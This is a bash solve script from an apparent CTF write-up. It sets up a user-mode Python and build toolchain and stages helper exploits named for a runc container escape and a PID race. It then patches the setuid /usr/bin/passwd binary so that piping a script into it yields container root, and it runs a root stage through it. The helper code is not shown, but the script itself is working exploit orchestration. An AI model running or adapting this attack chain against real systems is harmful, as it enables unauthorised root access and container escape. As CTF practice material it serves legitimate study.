#!/usr/bin/env bash
set -euo pipefail

# Copy this whole writeup directory to the CTF container and run:
#   bash solve_ctf.sh

SRC_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
WORK="${WORK:-/tmp/copyfail-poc-$(id -u)}"
PYROOT="${PYROOT:-$WORK/pyroot}"
PY="$PYROOT/usr/bin/python3"
export LD_LIBRARY_PATH="$PYROOT/usr/lib:$PYROOT/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}"

HELPERS=(
    cf_passwd_bash.py
    cf_write.py
    cf_patch_fd_host.py
    exploit_runc.py
    find_config_hostout.py
    install_ubuntu_libs.py
    pid_race.c
    root_stage.sh
)

log() {
    printf '[+] %s\n' "$*"
}

die() {
    printf '[-] %s\n' "$*" >&2
    exit 1
}

bootstrap_pyroot() {
    if [[ -x "$PY" && -x "$PYROOT/usr/bin/gcc" && -x "$PYROOT/usr/bin/zstd" ]]; then
        return
    fi

    log "bootstrapping Python/build tools in $PYROOT"
    mkdir -p "$PYROOT/etc/apk"
    cp -a /etc/apk/keys "$PYROOT/etc/apk/" 2>/dev/null || true

    local initdb=()
    [[ -d "$PYROOT/lib/apk/db" ]] || initdb=(--initdb)

    apk add \
        --root "$PYROOT" \
        "${initdb[@]}" \
        --usermode \
        --keys-dir /etc/apk/keys \
        --no-cache \
        --repository https://dl-cdn.alpinelinux.org/alpine/v3.23/main \
        python3 build-base zstd >/dev/null

    [[ -x "$PY" ]] || die "failed to install Python under $PYROOT"
}

stage_files() {
    mkdir -p "$WORK"

    for helper in "${HELPERS[@]}"; do
        [[ -f "$SRC_DIR/$helper" ]] || die "missing helper file: $helper"
        cp "$SRC_DIR/$helper" "$WORK/$helper"
    done

    chmod 700 "$WORK"/*.py "$WORK/root_stage.sh"
}

run_root_stage() {
    if [[ "$(id -u)" == "0" ]]; then
        log "already root; running root stage directly"
        WORK="$WORK" PYROOT="$PYROOT" PY="$PY" /bin/bash "$WORK/root_stage.sh"
        return
    fi

    log "patching /usr/bin/passwd to get container root"
    "$PY" "$WORK/cf_passwd_bash.py" /usr/bin/passwd

    log "launching root stage through patched /usr/bin/passwd"
    {
        printf 'WORK=%q\n' "$WORK"
        printf 'PYROOT=%q\n' "$PYROOT"
        printf 'PY=%q\n' "$PY"
        cat "$WORK/root_stage.sh"
    } | /usr/bin/passwd
}

main() {
    bootstrap_pyroot
    stage_files
    run_root_stage
}

main "$@"
